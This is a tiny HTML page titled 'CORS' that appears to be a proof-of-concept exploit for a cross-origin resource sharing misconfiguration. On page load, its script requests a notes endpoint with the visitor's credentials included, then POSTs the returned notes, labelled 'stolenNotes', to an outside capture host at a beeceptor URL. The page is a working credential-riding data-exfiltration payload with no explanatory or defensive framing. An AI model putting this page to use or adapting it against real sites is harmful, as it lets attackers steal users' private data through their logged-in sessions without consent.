
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>CORS</title>
</head>
<body>
  <h2>Not so private Notes</h2>
  
  <script>
fetch('https://localhost/get-notes', {
    method: 'GET',
    credentials: 'include'
})
.then(response => response.json())
.then(data => {
    fetch('https://fadsf.free.beeceptor.com/exfil', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ stolenNotes: data.notes })
    });
});
  </script>
</body>
</html>
